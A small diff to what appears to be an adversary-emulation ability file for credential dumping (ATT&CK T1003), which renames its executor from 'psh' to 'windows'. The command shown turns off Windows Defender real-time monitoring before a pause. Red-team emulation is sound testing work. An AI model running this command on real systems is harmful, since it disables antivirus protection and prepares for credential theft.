@@ -8,7 +8,7 @@
     attack_id: T1003
     name: Credential Dumping
   executors:
-    psh:
+    windows:
       command: |
         Set-MPPreference -DisableRealtimeMonitoring 1
         Start-Sleep -s 10
